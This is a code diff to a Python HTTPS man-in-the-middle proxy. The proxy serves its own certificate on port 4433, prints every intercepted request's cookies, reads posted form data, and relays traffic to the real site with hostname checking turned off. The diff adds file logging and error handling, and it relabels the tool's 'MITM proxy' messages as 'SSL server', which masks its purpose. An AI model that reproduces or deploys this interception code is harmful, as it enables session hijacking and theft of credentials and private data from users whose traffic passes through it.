@@ -4,9 +4,16 @@ import ssl
 import socketserver
 from cgi import parse_header, parse_multipart
 from urllib.parse import parse_qs
-import http.client, urllib.parse
-import gzip
-from urllib.parse import urlparse
+import http.client
+import logging
+
+
+logging.basicConfig(filename="log",
+                        filemode='a',
+                        format='%(asctime)s,%(msecs)d %(name)s %(levelname)s %(message)s',
+                        datefmt='%H:%M:%S',
+                        level=logging.DEBUG)
+logger = logging.getLogger('ssl server log')
 
 
 stop = 1
@@ -18,10 +25,10 @@ class MyHandler(BaseHTTPRequestHandler):
         print('[*] GET', self.headers['Host'] + "/" + self.path)
         hs = {}
         for h in self.headers:
+            #if str(h) != 'Accept-Encoding':
             hs[h] = self.headers[h]
         print("\t\tcookie: ", self.headers['Cookie'])
         print("\n")
-        ok = 0
 
         for i in range(10):
             try:
@@ -30,40 +37,37 @@ class MyHandler(BaseHTTPRequestHandler):
                 conn = http.client.HTTPSConnection(self.headers['Host'], context=ctx, check_hostname=False)
                 conn.request("GET", self.path, headers=hs)  # TODO check if headers are working
                 r1 = conn.getresponse()
-
                 data1 = r1.read()
 
                 self.send_response(r1.status)
                 for h in r1.headers:
                     self.send_header(h, r1.headers[h])
                 self.end_headers()
-
                 self.wfile.write(data1)
                 return
             except Exception as e:
-                print(str(e))
-            finally:
-                pass
-                #self.connection.close()
-
-
+                logger.error("while do_GET" + str(e))
 
     def parse_POST(self):
-        ctype, pdict = parse_header(self.headers['content-type'])
-        if ctype == 'multipart/form-data':
-            postvars = parse_multipart(self.rfile, pdict)
-        elif ctype == 'application/x-www-form-urlencoded':
-            length = int(self.headers['content-length'])
-            try:
-                self.params = self.rfile.read(length)
-                d = self.params.decode('ascii')
-                postvars = parse_qs(d)
-            except Exception as e:
-                print(str(e))
+        try:
+            ctype, pdict = parse_header(self.headers['content-type'])
+            if ctype == 'multipart/form-data':
+                postvars = parse_multipart(self.rfile, pdict)
+            elif ctype == 'application/x-www-form-urlencoded':
+                length = int(self.headers['content-length'])
+                try:
+                    self.params = self.rfile.read(length)
+                    d = self.params.decode('ascii')
+                    postvars = parse_qs(d)
+                except Exception as e:
+                    print(str(e))
+                    postvars = {}
+            else:
                 postvars = {}
-        else:
-            postvars = {}
-        return postvars
+            return postvars
+
+        except Exception as e:
+            logger.error("while parsing post variables")
 
     def do_POST(self):
         try:
@@ -86,7 +90,7 @@ class MyHandler(BaseHTTPRequestHandler):
             conn.request("POST", self.path, self.params, self.headers)  # TODO check if headers are working
             r1 = conn.getresponse()
 
-            data1 = r1.read()  # This will return entire content.
+            data1 = r1.read()
 
             self.send_response(r1.status)
             for h in r1.headers:
@@ -94,10 +98,7 @@ class MyHandler(BaseHTTPRequestHandler):
             self.end_headers()
             self.wfile.write(data1)
         except Exception as e:
-            print(str(e))
-        finally:
-            pass
-            #self.connection.unwrap()
+            logger.error("in do_POST: " + str(e))
 
     def log_message(self, format, *args):
         return
@@ -113,13 +114,14 @@ def start_server(host_ip):
     global stop
     while stop:
         try:
-            print("[*] MITM proxy running...")
+            print("[*] SSL server running...")
             httpd = ForkingHTTPServer((host_ip, 4433), MyHandler)
             httpd.socket = ssl.wrap_socket(httpd.socket, certfile='cert.pem', keyfile='key.pem', server_side=True,
                                            cert_reqs=ssl.CERT_OPTIONAL, ssl_version=ssl.PROTOCOL_TLSv1)
-            httpd.serve_forever()  # serve_forever
+            httpd.serve_forever()
         except Exception as e:
             print(str(e))
         finally:
             httpd.socket.close()
-            print("[*] MITM proxy stopped")
+            httpd.server_close()
+            print("[*] SSL server stopped")
